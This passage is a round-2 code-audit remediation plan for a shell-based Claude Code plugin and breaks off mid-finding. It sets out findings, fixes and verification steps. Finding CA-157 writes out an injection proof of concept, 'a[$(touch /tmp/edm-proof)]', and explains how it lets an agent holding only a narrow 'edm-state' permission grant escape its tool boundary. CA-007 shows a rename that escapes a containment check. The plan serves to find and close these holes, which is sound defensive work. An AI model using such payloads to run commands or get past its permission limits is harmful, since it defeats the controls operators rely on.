# Code Audit Remediation Plan: EDMV3 -- Prompt Streamline (Round 2)

## Context

- Audit date: 2026-07-31
- Round: pass-2, **full** (all eleven lenses ran; `lenses-run.txt` records `Round type: full`)
- Branch: `edm/edmv3-prompt-streamline`
- Audited scope: `plugins/edm/**` (bin, bin/tests, skills, agents, hooks, evals, docs, CLAUDE.md,
  CHANGELOG.md, README.md), repository-root `.gitlab-ci.yml` and `.gitignore`, and this
  initiative's SRD, ticket pack and decision ledger
- SRD: `SRD/edm/EDMV3__prompt-streamline/srd.md` (v1.3.0)
- Ticket pack: `SRD/edm/EDMV3__prompt-streamline/tickets/README.md`
- Decision ledger consulted: `SRD/edm/EDMV3__prompt-streamline/decisions.md` (D1-D32)
- Deployment target: local (macOS, bash 3.2) plus GitLab CI (`plugins/edm/**` pipeline)
- Ledger: `SRD/edm/EDMV3__prompt-streamline/code-audit/findings-ledger.jsonl` (authoritative;
  `findings-ledger.md` is rendered from it by `edm-state render-ledger`)
- Remediation under audit: commits `6ddcf0c`, `072f53e`, `48af7a0` (between round 1 and round 2)
- Method note: every lens was instructed to re-derive each of its round-1 verdicts from the current
  tree rather than trust the ledger's `status` field. Every lens did so and several reversed a
  ledger status in both directions. **No lens had a `Write` tool at runtime** (ledger CA-130,
  second consecutive round); all eleven reports were returned as agent text and transcribed by the
  orchestrator. Two lenses (L1, L3) additionally had no `Bash`, so a small number of verdicts are
  static-read only and are marked `medium` confidence at their entries.

## Convergence verdict: NOT CONVERGENT

1 open P0, 13 open P1 and 77 open P2 remain. `BLOCKING_FILTER` in `plugins/edm/bin/edm-state`
includes open P2, so all 91 are in the blocking set. This was a **full** round, so the partial-round
refusal does not apply -- the round is not convergent on its merits. No closure note is written.

The round was nonetheless highly productive: **46 of the 101 findings open at the end of round 1
were confirmed fixed by independent re-verification**, including all three remaining round-1 P0s
worth of injection surface, the shared-library extraction, the CI status-capture class, and the
`.gitignore`/temp-file hygiene class. What blocks convergence is the long tail: 36 genuinely new
findings, and 44 prior findings where the remediation landed on some of the cited sites but not all
of them.

## Counts

| Severity | Open | Fixed this round | Noted |
|---|---|---|---|
| P0 | 1 | 3 | -- |
| P1 | 13 | 18 | -- |
| P2 | 77 | 25 | -- |
| NOTED | -- | -- | 40 |

- Total ledger entries: **181** (132 carried from round 1, 49 raised this round).
- Fixed this round (`resolved_round: 2`): **46**.
- Already fixed in round 1 and re-verified clean this round (no regression): CA-001, CA-003,
  CA-004, CA-044.
- Raised this round: 36 actionable (CA-133 - CA-168) + 13 NOTED (CA-169 - CA-181).
- Re-opened from NOTED: **CA-127** (repository-root `CLAUDE.md` registry entry) -- L9 supplied the
  ownership argument round 1 lacked; see its entry.
- Not-actionable filtered this round: **13** new NOTED entries plus 27 carried NOTED re-confirmed.
- Re-graded on re-open, honouring each lens's stated rationale: CA-005 P1->P2, CA-010 P1->P2,
  CA-014 P1->P2, CA-016 P1->P2, CA-017 P1->P2, CA-018 P1->P2, CA-019 P1->P2, CA-024 held at P1,
  CA-025 P1->P2, CA-026 P1->P2, CA-034 P1->P2, CA-037 P1->P2, CA-038 P1->P2, CA-042 P1->P2.

## Multi-lens findings (highest confidence)

Findings corroborated by two or more independent lenses this round, in severity order. These are
the ones to act on first within their tier.

| ID | Sev | Lenses | Component |
|---|---|---|---|
| CA-002 | P0 | L1+L4 | `bin/tests/wave7-smoke.sh:1607-1630` |
| CA-007 | P1 | L1+L2+L11 | `evals/run-eval.sh:452` |
| CA-011 | P1 | L1+L3+L6 | `hooks/hooks.json:86` |
| CA-013 | P1 | L9+L11 | `docs/canonical-sections.md:1` |
| CA-005 | P2 | L1+L2+L6+L7+L10 | `bin/edm-sync-canonical-sections:43` |
| CA-010 | P2 | L6+L7+L10 | `bin/tests/wave7-smoke.sh:296-299` |
| CA-019 | P2 | L7+L10 | `evals/score-artifacts.sh:303` |
| CA-018 | P2 | L6+L10 | `agents/edm-audit-synthesizer.md:85-90` |
| CA-049 | P2 | L7+L10 | `bin/edm-check-vocabulary:56` |
| CA-155 | P2 | L7+L10 | `bin/_edm-lint-lib.sh:95-99` |
| CA-156 | P2 | L7+L10 | `bin/edm-check-grants:127-130` |
| CA-133 | P2 | L1+L3 | `bin/edm-state:3699` |
| CA-135 | P2 | L1+L8 | `bin/edm-state:1945-1948` |
| CA-014 | P2 | L5+L8 | `evals/tiering-matrix.sh:136` |
| CA-016 | P2 | L4+L7 | `bin/tests/run-all.sh:27` |
| CA-017 | P2 | L1+L6 | `bin/edm-lint-artifacts:233-236` |
| CA-071 | P2 | L1+L6 | `.gitlab-ci.yml:192` |
| CA-085 | P2 | L4+L8 | `bin/tests/wave7-smoke.sh:3386` |
| CA-095 | P2 | L10+L11 | `agents/edm-audit-dry.md:71` |
| CA-127 | P2 | L6+L9 | `CLAUDE.md:54` (repository root) |

## The four root causes that account for the most findings

1. **Partial application of a multi-site remediation -- 44 findings.** The dominant pattern of this
   round. A finding named two or three sites; one was edited. The code half was fixed and the test
   or doc half was not. L6 documented this most sharply: five of its seven still-open findings are
   "the remediation edited one of two or three cited sites". CA-005, CA-010, CA-014, CA-016,
   CA-017, CA-018, CA-019, CA-022, CA-024, CA-025, CA-026, CA-034, CA-037, CA-038, CA-039, CA-042,
   CA-049, CA-058, CA-059, CA-061, CA-068, CA-069, CA-071, CA-076, CA-080, CA-084, CA-085, CA-089,
   CA-100, CA-102 are all instances. The purest is CA-010: the dead symbol `build_ignore_set` was
   removed from the two source comments and left standing in the smoke assertion that guards them.
   **A mechanical guard is warranted**: a CI check that no comment, label or failure message names
   a shell function absent from the tree would have caught CA-010 and CA-154 at zero cost.

2. **The remediation introduced new defects -- 15 findings.** Every one of the six largest round-1
   fixes left residue. The `to_int` coercion produced CA-135 and CA-140. The lock rewrite produced
   CA-141, CA-142 and CA-143. The `write_atomic` + splice rewrite produced CA-133 and CA-134. The
   shared-library extraction produced CA-153, CA-155 and CA-156. The CA-020 JSONL fix produced
   CA-164 -- a P1 schema conflict that did not exist in round 1. The CA-084 perl guard produced
   CA-158 -- a P1 that fabricates measurement digits. The CA-035 regex widening produced a
   demonstrable false positive (CA-035 itself). The new harness helpers produced CA-145, and the
   rewritten aggregator produced CA-146. **Every one of these is a case where the fix landed and no
   test was added that would have failed before it.**

3. **The shared-library extraction stopped one consumer and one function short -- 6 findings.**
   `bin/_edm-lint-lib.sh` is real, is sourced by all three `bin/` consumers, and eliminated
   CA-009 and CA-050 outright. But `evals/score-artifacts.sh` -- the third hand-copy named in round
   1's root cause 1 -- was never converted; its Mermaid rule was brought into agreement by **cloning
   the canonical awk verbatim** (CA-019), leaving two byte-equivalent copies with no guard holding
   them together and a still-divergent fence grammar. `ignored_line_set` stayed hand-copied
   (CA-156), `print_help` was never shared and grew from 5 copies to 12 in 3 shapes (CA-005),
   `report_violation` encoded the caller naming divergence rather than resolving it (CA-155), and
   the library shipped with no header at all (CA-153).

4. **The injection class was closed per-field, not per-sink -- 3 findings.** `to_int`'s own
   docstring scopes the rule to "every value read out of `.edm-state.json`". CA-157 is the same
   `[[ $((x + 1)) -eq "$y" ]]` mechanism reached through a **command-line argument**, which no
   round-1 fix and no prescribed PoC covers. CA-159 (path interpolated into a trap body) and
   CA-160 (`HUMAN_HOURLY_RATE_USD` spliced into jq program text) are the same shape on the install
   path and the environment. The rule needs restating as "every value from any external source --
   state file, environment, or command line".

---

# P0

## CA-002 (P0, lenses L1 + L4): `cmd_update_patterns`' rewritten insertion path has zero runtime coverage

**Sites**: implementation `plugins/edm/bin/edm-state:3676-3716` (`_splice_pattern_file`,
`_cmd_update_patterns_body`), `:3643-3661` (`pattern_insert_line_for`), `:3718-3805`
(`cmd_update_patterns`); only test at `plugins/edm/bin/tests/wave7-smoke.sh:1607-1630`.

**Problem**: The code half of the round-1 prescription landed in full -- the body now routes
through `with_state_lock "${pattern_file%.md}"` (`:3790`), `write_atomic "$pattern_file"
_splice_pattern_file` (`:3712`), and the read-only guard correctly tests the *directory*
(`:3764-3769`). **The test half was not written at all.** L1 and L4 reached this independently.

The only runtime invocation of `update-patterns` in the entire suite is `t42_ac9_case`, which seeds
a deliberately duplicate title so `new_findings` stays `0` and the whole `if [[ "$new_findings" -gt
0 ]]` block at `:3705-3713` is never entered. An implementation with an empty
`_splice_pattern_file`, a `pattern_insert_line_for` that returns `0`, or a `write_atomic` that
no-ops passes unchanged. `wave7:1003-1004` is not coverage -- it greps the source file for the
literal string `write_atomic "$pattern_file" _splice_pattern_file`.

Still uncovered: the insertion itself, the `pending-review` Append Schema block, the atomic `mv`,
the `---` back-up, the last-section EOF case, both copies of the missing-heading SKIP whose
contract is "never fall back to EOF", the not-writable skip, `pattern_target_heading_for`, and
idempotence across a second run.

The scratch-binary half also did not land. `_harness.sh:78` prepends the **real** `plugins/edm/bin`
to `PATH` and `cmd_update_patterns:3730-3736` derives `patterns_dir` from `$0`'s directory, which
`with_scratch_repo` does not redirect -- so **if de-duplication regresses, the test writes into
committed plugin source**, and because it targets the second `##` heading,
`_t56_four_heading_contract_check` would not catch it.

Compounding: `wave7:2632-2640` and `:2895-2907` still print BLOCKED-ON-OWNER blocks claiming AC1-AC12
"require the insertion-logic rewrite at `bin/edm-state:1576-1692`, out of this batch's file remit".
That rewrite landed. The stale prose reads as a live blocker, which is how this stayed invisible.

**This is also the reason CA-133 shipped undetected.** A presence-only assertion cannot see a
missing trailing newline; only a byte-content assertion can.

**Fix**: copy `bin/` and `docs/` into the scratch tree and invoke the scratch binary as
`t30_ac2_case` already does. Then add:
1. One case with two novel `### ` headings plus one duplicate, asserting: exactly two entries
   appended; both carry `status: pending-review`; both land between `## Anti-Patterns` and
   `## Pre-Flight Checklist`; `_t56_four_heading_contract_check` clean afterwards; the duplicate
   skipped; a second run appends nothing. **Assert the byte content of the appended block, not only
   its presence.**
2. A second case with `## Anti-Patterns` removed from the scratch document, asserting the
   `skipping (nothing appended, no end-of-file fallback)` message on stderr, exit 0, and
   byte-identity of the document.
3. Delete the stale BLOCKED-ON-OWNER blocks at `wave7:2632-2640` and `:2895-2907` in the same
   commit.

**Verification**: revert `_splice_pattern_file` to `return 0` and confirm both new cases fail;
restore and confirm both pass. Then apply CA-133's one-line fix and confirm the byte-content
assertion is what proves it.

**Files affected**: `plugins/edm/bin/tests/wave7-smoke.sh`, `plugins/edm/bin/tests/_harness.sh`
(scratch `bin/`+`docs/` copy, if not already available).

---

# P1

## CA-157 (P1, lens L8, NEW): the arithmetic-context injection class is still live, on `phase-start`'s command-line argument

**Site**: `plugins/edm/bin/edm-state:660`, reached from `:1517` -> `:1545`.

**Problem**: `cmd_phase_start` takes `local prefix="$1" phase="$2"` at `:1517` and **never validates
`phase`**. At `:1545` it calls `phase_start_prerequisite_gate "$phase"`, whose body at `:660` is:

```bash
[[ $((gated_phase + 1)) -eq "$phase" ]] && { echo "$g"; return 0; }
```

`-eq` arithmetic-evaluates *both* operands, so `$phase` is recursively expanded and any array
subscript inside it is arithmetic-evaluated, which performs command substitution. This is
byte-for-byte the mechanism `to_int`'s own comment at `:67-73` documents and states was confirmed on
bash 3.2.57. `edm-state phase-start ABCD 'a[$(touch /tmp/edm-proof)]'` reaches it whenever
`schema_version >= 1` and `mode` is set -- which is every initiative `edm-init` has ever created,
since `_cmd_init_render:1294` writes `schema_version: 1`.

This is a **different input channel** from CA-001/CA-003, which is why both the round-1 fix and the
prescribed PoC miss it: `to_int`'s contract is written as "every value read out of
`.edm-state.json`", and this value is not read out of the state file. It is also inconsistent with
the file's own conventions -- three sibling subcommands validate their numeric arguments before use
(`:1806` `pct`, `:1825` `count`, `:3486` `phase_num` with `^[1-6]$`); `phase-start` and
`phase-complete` are the two that do not.

Graded P1 rather than P0 because it needs an attacker to influence the *arguments* of an
`edm-state` call, not merely a committed state file. Two concrete paths make that realistic:
(a) the plugin's documented permission posture is prefix grants -- in a session allowed
`Bash(edm-state *)` but not bare `Bash`, this argument is a full escape of the tool boundary;
(b) `evals/run-eval.sh:231` is exactly that configuration, committed, with
`--permission-mode acceptEdits` at `:230`, no bare `Bash`, no human in the loop, and the fixture's
`INITIATIVE_BODY` interpolated into the phase prompt. That makes CA-086's comment ("the run cannot
reach anything outside the scratch tree via a tool call") doubly false.

**Fix**: validate at the entry point and coerce at the sink, both.

```bash
# edm-state:1518, copying cmd_skip_phase:3486 verbatim
[[ "$phase" =~ ^[1-6]$ ]] || die "phase-start: phase-num must be 1-6; got: $phase"
# same in cmd_phase_complete:1576
# and inside phase_start_prerequisite_gate, defence in depth:
phase="$(to_int "$1" 0)"
```

Then widen `to_int`'s docstring at `:63-65` from "read out of `.edm-state.json`" to "every value
from any external source -- state file, environment, or command line."

**Verification**: `printf '%s' '{"prefix":"XX","schema_version":1,"mode":"standard"}' >` a scratch
state file; run `edm-state phase-start XX 'a[$(touch /tmp/edm-proof)]'`; assert `/tmp/edm-proof`
does not exist and the command exits with the named diagnostic. Add the `phase-start` case to the
`wave6-smoke.sh` injection block beside the existing `current_phase` and `schema_version` cases so
all three channels are covered by one pattern. **The runtime PoC round 1 prescribed is still owed
and has never been run** -- no lens has had a `Bash` tool in either round.

**Files affected**: `plugins/edm/bin/edm-state`, `plugins/edm/bin/tests/wave6-smoke.sh`.

---

## CA-164 (P1, lens L11, NEW): the lens launch template hands the lens the ledger schema, contradicting all eleven agent definitions and all eleven fixtures

**Site**: `plugins/edm/skills/code-audit/SKILL.md:201` against `plugins/edm/agents/edm-audit-*.md`
(eleven files, `## JSONL Line Format`) and `plugins/edm/bin/tests/fixtures/code-audit/lens-L*.jsonl`
(eleven files).

**Problem**: two different JSONL schemas exist for the same artifact, and the operative instruction
names the wrong one.

- **Lens-stage schema**, declared identically in all eleven agent definitions (e.g.
  `edm-audit-wiring.md:118`) and used by all eleven committed ground-truth fixtures:
  `{"schema":1,"id":null,"lens":"L11","round":N,"round_type":"...","sev":...,"confidence":...,"file":"path","line":42,"title":"...","status":"open"}`
- **Ledger schema**, the synthesizer's output, consumed by `edm-state render-ledger`
  (`bin/edm-state:2986` reads `.lenses | join("+")` and `.component`):
  `{"schema":1,"id":"CA-NNN",...,"lenses":[...],"component":"path","raised_round":N,"resolved_round":null}`

`SKILL.md:201` -- the launch template, the instruction that is operative at spawn time -- hands the
lens the **ledger** schema, prefixed "one finding per line matching findings-ledger.jsonl".
`edm-audit-wiring.md:120` says "`id` is always `null` at the lens stage -- the synthesizer assigns
the stable `CA-NNN` ledger ID"; `SKILL.md:201` puts `"id":"CA-NNN"` in the lens's own template.
The fixture README at `:21-22` states the contract as the lens shape. Three artifacts, three-way
inconsistent on field names (`lens` vs `lenses`, `file`+`line` vs `component`) and directly
contradictory on ID ownership.

**This round is the live instance and it is self-evidencing**: every one of the eleven lens JSONL
files in this pass directory follows the prompt rather than the agent contract, so the eleven
committed fixtures no longer describe the artifact the pipeline actually produces -- which is what
`evals/score-artifacts.sh` dimension 5 scores against (see CA-165).

**Regression note**: this defect did not exist in round 1, when the skill named no JSONL at all. It
was **introduced by the CA-020 remediation**, which added the artifact name and the wrong schema in
one edit.

**Fix**: delete the inline schema from the launch template at `SKILL.md:201` and replace it with
"emit the schema in your own `## JSONL Line Format` section" -- one fact in thirteen places is what
produced the divergence. If an inline schema must stay, paste the lens-stage line verbatim from
`agents/edm-audit-wiring.md:118`.

**Verification**: add a smoke assertion in `wave7-smoke.sh` that the field set named in
`skills/code-audit/SKILL.md`'s launch template equals the field set in each
`agents/edm-audit-*.md` `## JSONL Line Format` block (or, if the inline schema is deleted, that the
template contains no `"id":"CA-` literal). Re-run one lens and diff its JSONL field names against
`bin/tests/fixtures/code-audit/lens-L11.jsonl`.

**Files affected**: `plugins/edm/skills/code-audit/SKILL.md`,
`plugins/edm/bin/tests/wave7-smoke.sh`.

---

## CA-158 (P1, lens L8, NEW): the perl-less timing fallback fabricates its sub-second digits with `rand()`

**Site**: `plugins/edm/bin/tests/timing.sh:36`, consumed by `:41-47` and by every measurement mode.

**Problem**: the CA-084 remediation added a `command -v perl` guard with an awk fallback. The
fallback is:

```bash
awk 'BEGIN{srand(); printf "%.6f\n", systime() + rand()}'
```

`systime()` gives whole seconds; `rand()` adds a **uniform random** fraction in `[0,1)`. Two
consecutive `_now()` readings therefore differ by the real elapsed time **plus a random term in
(-1000, +1000) ms**. `_ms_between` can and will return negative durations, and a sub-second
operation's measured p95 is pure noise. This is not degradation, it is fabrication -- and it fires
on exactly the images the fallback was added for: `alpine:3.20` and `bash:3.2` ship no perl, which
is the whole premise of CA-084.

Compounding: the harness header at `:7` states "Every mode is a REAL measurement against a REAL
(generated) fixture -- no numbers are invented", and `CHANGELOG.md`'s EDMV3-T67 table quotes this
harness's output as the committed budget evidence. A number produced through this path is
indistinguishable in the log from one produced through perl -- no marker, no warning.

**Fix**: use a fallback that is honest about its resolution instead of one that invents digits --
`date +%s` with a `_ms_between` that returns whole-second granularity plus a one-line stderr notice
naming the degraded resolution; or `die` with a named message and require perl for sub-second
modes. Whichever is chosen, `_now` must never return a value that is not monotone with real time.
Fix `:294`'s unconditional `perl -e` (CA-084) in the same edit:
`awk -v a="$p95_base" -v b="$p95_mermaid" 'BEGIN{printf "%.2f", b/(a>0?a:1)}'` needs no new
dependency.

**Verification**: `PATH=/usr/bin:/bin env -u PERL5LIB bash -c 'command -v perl || true'` on the
alpine image; then run `timing.sh --lint` twice in the perl-less path and assert every emitted
`duration_ms` is non-negative and that two runs of the same fixture agree within a stated tolerance.
Add a `harness-smoke.sh` case asserting `_ms_between "$(_now)" "$(_now)"` is `>= 0`.

**Files affected**: `plugins/edm/bin/tests/timing.sh`, `plugins/edm/bin/tests/harness-smoke.sh`.

---

## CA-007 (P1, lenses L1 + L2 + L11): the porcelain rename form is still mis-parsed in the containment check

**Site**: `plugins/edm/evals/run-eval.sh:450-457`, specifically `:452`.

**Problem**: Three of the four sub-sites are fixed and independently re-verified by L1, L2 and L11:
`.gitlab-ci.yml:347-356`, `:494-500` and `:552-558` all now use `rc=0; cmd || rc=$?`, so the
BLOCKING, structural-error and `NOT ARMED` handlers are reachable; `run-eval.sh:443-447` captures
the containment status separately instead of inside a heredoc. The fourth is unchanged:

```bash
while IFS= read -r line; do
  [ -z "$line" ] && continue
  path="${line:3}"
  case "$path" in
    SRD/*) ;;
    *) CONTAINMENT_VIOLATIONS="..." ;;
```

`git status --porcelain` emits a rename as `R  <old> -> <new>`. `${line:3}` yields
`SRD/foo.md -> ../../evil.md`, which matches the `SRD/*` glob, so **a rename whose destination
escapes `SRD/` is scored as contained**. This is the AC9 / EDMV3-93 safety property -- the one check
that would catch the eval driver mutating the host tree.

**Fix**:

```bash
xy="${line%%"${line#??}"}"          # first two status characters
path="${line:3}"
case "$xy" in
  R*|C*) path="${path##* -> }" ;;   # porcelain rename/copy: the destination is what matters
esac
case "$path" in SRD/*) ;; *) CONTAINMENT_VIOLATIONS=... ;; esac
```

**Verification**: add a unit case that stages `git mv SRD/x.md ../escape.md` in a scratch tree and
asserts `containment: VIOLATION`.

**Files affected**: `plugins/edm/evals/run-eval.sh`, `plugins/edm/bin/tests/wave7-smoke.sh`.

---

## CA-011 (P1, lenses L1 + L3 + L6): the commit hook still cannot read the exit-code split, and blocks clean commits

**Site**: `plugins/edm/hooks/hooks.json:86`.

**Problem**: the **documentation half is fixed** and L6 confirms it -- `edm-lint-artifacts:31-35`
now states the truth ("blocks on any non-zero exit and prints one generic remediation line for both
classes"), and the hook message reads "Fix artifact violations **or edm-lint-artifacts
setup/usage errors**". That half is documented-as-intentional and is not re-filed.

Two live halves remain (L3, corroborated by L1's full read of `hooks.json` this round):

1. **Prefixes are still derived from staged paths with no check that they resolve.** A staged
   `git rm -r SRD/OLDPFX/`, a pre-plugin `SRD/LEGACY-DOCS/`, or a flat-layout file with a double
   underscore yields a prefix with no state file; `edm-lint-artifacts` exits 2 ("no initiative for
   prefix") and **the commit is blocked on a tree with no violations**.
2. **The exit-1-vs-exit-2 blocking semantics are still unsettled.** A `PreToolUse` hook must exit 2
   to block; the honest violation path exits 1. `plugins/edm/CLAUDE.md`'s hooks table now asserts
   "any non-zero exit blocks the commit", which **pins the unverified assumption** rather than
   resolving it.

**Fix**: capture the status and branch on 1 vs 2; derive prefixes only from paths whose state file
resolves (`edm-state resolve-dir "$p" >/dev/null 2>&1 || continue`); and settle (2) empirically --
one manual `git commit` with a seeded violation, observing whether exit 1 blocks. Whatever the
answer, make the hook exit the code that blocks and update CLAUDE.md's hooks table to record the
observed behaviour rather than the assumption.

**Verification**: stage a deletion of an entire initiative directory and confirm the commit is
permitted; stage a file with an attribution trailer and confirm it is blocked; record the observed
`PreToolUse` semantics in the hooks table.

**Files affected**: `plugins/edm/hooks/hooks.json`, `plugins/edm/CLAUDE.md`,
`plugins/edm/bin/tests/wave7-smoke.sh`.

---

## CA-013 (P1, lenses L9 + L11): EDMV3-116's negative branch is still half-landed -- nothing shipped

**Site**: `plugins/edm/docs/canonical-sections.md:1`; contract at `srd.md:2846-2852`; gating prose
at `plugins/edm/CLAUDE.md:300-302`; decision at `decisions.md:28` (D22).

**Problem**: unchanged from round 1, verified independently by both lenses.
`grep -rn 'canonical-sections\.md' plugins/edm/agents plugins/edm/skills` returns **zero hits**.
The generator (`bin/edm-sync-canonical-sections`), the generated file, and the CI drift guard all
exist; the consumer half is unshipped. Three specific consequences:

- `srd.md:2846-2849` still mandates the reference form `` `CLAUDE.md Sec."..."` `` *exactly*, and
  `:2850-2852` still requires those references "verified to actually resolve from an installed
  plugin cache" -- the thing D22 disproved by two independent methods. EDMV3-54 and EDMV3-116 remain
  mutually unsatisfiable with no change request raised.
- D22 still closes with "should be picked up as **its own immediate follow-up ticket**" -- the exact
  "candidate, not a follow-on" construction D29 forecloses. Nothing in `decisions.md` postdates D32.
- **New aggravating evidence this round**: `plugins/edm/CLAUDE.md:300-302` still describes the
  relocation as future work, "**once EDMV3-T42 lands**". T42 landed at `fa108ee` and merged at
  `424f3dc`, two waves ago. The conventions file states a precondition that is already in the past
  while the edit it gates has never been made.

This is also the standing reason authors keep restating the severity table (CA-018): the
plugin-relative fallback the prescription depends on does not exist.

**Fix**: three edits, in this order.
1. Add `Read plugins/edm/docs/canonical-sections.md` (with the plugin-root anchor CA-022 requires)
   to the agents and skills that currently cite `CLAUDE.md Sec."Severity vocabulary"` and
   `Sec."Mermaid diagram conventions"` -- at minimum `agents/edm-audit-synthesizer.md`,
   `agents/edm-srd-auditor.md`, and the eleven lens definitions.
2. Amend `srd.md:2846-2852` through gate change control to accept the plugin-relative form, and
   drop the "verified to resolve from an installed plugin cache" clause D22 disproved.
3. Update `plugins/edm/CLAUDE.md:300-302` to state the current position, not the T42 precondition,
   and open a named ticket (`EDMV4-T02` or equivalent) for the residual, recorded in `decisions.md`
   as D33.

**Verification**: `grep -rlc 'docs/canonical-sections\.md' plugins/edm/agents plugins/edm/skills`
returns a non-zero count; `bin/edm-sync-canonical-sections --check` still exits 0.

**Files affected**: `plugins/edm/docs/canonical-sections.md` (consumers), `plugins/edm/CLAUDE.md`,
`SRD/edm/EDMV3__prompt-streamline/srd.md`, `SRD/edm/EDMV3__prompt-streamline/decisions.md`,
eleven `plugins/edm/agents/edm-audit-*.md`.

---

## CA-022 (P1, lens L11): the plugin-asset anchor landed on the skills and not on the agents

**Site**: `plugins/edm/agents/edm-ticket-writer.md:27-29,36-37`;
`plugins/edm/agents/edm-implementer.md:22-23`; `plugins/edm/agents/edm-srd-writer.md:23`.

**Problem**: the skill side is fixed (`tickets/SKILL.md:47-48`, `audit-tickets/SKILL.md:40,131`).
The **agent side, which the round-1 remediation named explicitly, was not touched**: three agent
definitions still read bare `docs/templates/ticket-size-legend.md`,
`docs/templates/cross-cutting-ac.md` and `docs/audit-patterns/ticket-audit.md` cwd-relative, with
no plugin-root anchor, no "plugin-root-relative" qualifier, no plugin-asset note in the file, and no
defined failure behaviour. **The agent, not the skill, is what runs at write time**, so the
practical outcome -- a re-authored legend -- is unchanged.

**Fix**: add the same "Plugin asset note" header the five skills now carry (`code-audit:20`,
`audit-srd:18`, `audit-tickets:18`, `plan:18`, `tickets:18`) to the three agent files, and qualify
each `docs/...` read as plugin-root-relative with a stated failure behaviour ("if the file cannot be
resolved, stop and report; do not re-author it").

**Verification**: `grep -rn 'docs/templates\|docs/audit-patterns' plugins/edm/agents/` -- every hit
carries the plugin-root qualifier. Add a `wave7-smoke.sh` assertion that no `agents/*.md` names a
`docs/` path without the qualifier.

**Files affected**: `plugins/edm/agents/edm-ticket-writer.md`,
`plugins/edm/agents/edm-implementer.md`, `plugins/edm/agents/edm-srd-writer.md`,
`plugins/edm/bin/tests/wave7-smoke.sh`.

---

## CA-023 (P1, lens L8): the commit hook still hardcodes `^SRD/`, so a relocated `srd_root` loses all enforcement

**Site**: `plugins/edm/hooks/hooks.json:86`; assertion at `plugins/edm/bin/tests/wave7-smoke.sh:3370`.

**Problem**: unchanged. `git diff --cached --name-only | grep '^SRD/'`, and the awk field indices
`$2`/`$3` bake in the same one-level assumption independently. What changed is documentation:
`bin/edm-lint-artifacts:44-46` now states the limitation in the help block. **That does not clear
the finding** -- `srd_root` remains a first-class `userConfig` option that `edm-lint-artifacts`
itself honours at `:50`, so a project using the documented option still loses **all** commit-time
attribution-trailer / non-ASCII / tool-tag enforcement with no runtime signal. L8 correctly notes
this is not eligible for the false-alarm filter: documented-as-known is not documented-as-intended,
and the doc itself says "unless the hook is updated too".

The seven AC8 assertions pin the defect: `wave7-smoke.sh:3370` asserts the literal string
`grep '^SRD/'` is present, so **the prescribed fix would fail the suite**.

**Fix**: derive the root in the hook the way the binaries do
(`${CLAUDE_PLUGIN_OPTION_SRD_ROOT:-${EDM_SRD_ROOT:-SRD}}`), strip it before the awk field split, and
rewrite `wave7-smoke.sh:3370` to assert the *behaviour* (a relocated root is honoured) rather than
the literal matcher.

**Verification**: set `EDM_SRD_ROOT=docs/initiatives`, stage a file with an attribution trailer
under it, and confirm the commit is blocked.

**Files affected**: `plugins/edm/hooks/hooks.json`, `plugins/edm/bin/tests/wave7-smoke.sh`.

---

## CA-024 (P1, lens L8, medium confidence): `lint:shellcheck` still loops unconditionally, and one word-splitting site carries no directive

**Site**: `plugins/edm/bin/edm-state:112-113`; job at `.gitlab-ci.yml:145`, comment at `:127-129`.

**Problem**: the named round-1 sites are covered -- seven `# shellcheck disable=SC2086` directives
with the bash-3.2 rationale now exist at `edm-check-grants:110`, `:184`, `edm-state:939`, `:1262`,
`:2105`, `:3077`, `:4167`, and L7 independently re-checked them and found them clean and
consistently worded. Two things did not land:

1. `.gitlab-ci.yml:145` still loops unconditionally over `plugins/edm/bin/*` while `:127-129` claims
   the scope is "new/modified code", and the loop now also picks up `bin/_edm-lint-lib.sh`.
2. One site in the loop's scope appears still uncovered: `bin/edm-state:112-113`, the unquoted
   `${include_archived:+"$SRD_ROOT"/.archived/*/.edm-state.json}` pair in `list_state_files`.
   ShellCheck reports unquoted `${var:+word}` as SC2086, which is in the job's
   `--include=SC2086,SC2046,SC2048,SC2068` set. The word-splitting there is deliberate (the point is
   that the glob expands), so quoting would break it and a directive is the right fix.

**Held at P1** despite being single-lens because the consequence is a red **blocking** job. Flagged
`medium` confidence solely because no lens could execute ShellCheck; **the finding cannot be closed
until one pipeline run shows `lint:shellcheck` green**, which is exactly the verification round 1
asked for and which has still not happened.

**Fix**: add `# shellcheck disable=SC2086 -- deliberate glob expansion; quoting would prevent the
archived-state glob from expanding` above `bin/edm-state:112`. Either scope the job to changed files
or correct the comment at `:127-129` to say the job lints all of `bin/`.

**Verification**: run `shellcheck --include=SC2086,SC2046,SC2048,SC2068 plugins/edm/bin/*` locally,
or push and observe one green `lint:shellcheck`.

**Files affected**: `plugins/edm/bin/edm-state`, `.gitlab-ci.yml`.

---

## CA-027 (P1, lens L3): `HANDOFF.md` is now atomic, but the Notes block is still degraded on every rewrite and the read-modify-write is unlocked

**Site**: `plugins/edm/bin/edm-state:4024-4025` (notes filter), `:4188` (write).

**Problem**: the atomicity half is fixed -- `:4188` is
`write_atomic "$handoff_path" _print_literal "$handoff_content" || die ...` and the whole document
renders into a variable first, so a hook timeout can no longer leave a truncated file. Two halves
remain, byte-for-byte unchanged from round 1:

```bash
notes="$(awk '/^## Notes/{p=1;next} p && /^## /{p=0} p{print}' "$handoff_path" 2>/dev/null \
  | grep -v '^[[:space:]]*$' || true)"
```

1. **Every blank line in user-authored Notes is deleted on each rewrite**, so paragraph structure is
   destroyed permanently and irrecoverably -- `HANDOFF.md` gets no `.bak` (only `.edm-state.json`
   does, at `:527`). The `p && /^## /{p=0}` clause also truncates the block at the first `## ` a
   user writes inside their own notes. This runs on **every Stop and PreCompact hook, for every
   active initiative**.
2. **`write_handoff_internal` takes no lock.** Reading at `:4024`, rendering, and replacing at
   `:4188` is an unlocked read-modify-write over user-authored content: two windows checkpointing
   the same initiative lose one window's notes entirely.

**Fix**: preserve the block verbatim -- drop the `grep -v`, and terminate on the *next known
generated heading* or on EOF, not on any `## `. Wrap the read-render-write in
`with_state_lock "${state_file%.json}"`.

**Verification**: write a `## Notes` block containing blank lines and a user `## ` subheading, run
`edm-state checkpoint` twice, and assert byte-identity of the Notes block across both runs.

**Files affected**: `plugins/edm/bin/edm-state`, `plugins/edm/bin/tests/wave6-smoke.sh`.

---

## CA-035 (P1, lens L4): the T42 AC4 quoting-consistency assertion is a demonstrable false positive introduced by the round-1 remediation

**Site**: `plugins/edm/bin/tests/wave7-smoke.sh:1567-1571`.

**Problem**: the round-1 prescription ("widen the capture to the reference family, then count
distinct forms") was applied, and the widened regex inverts the test:

```bash
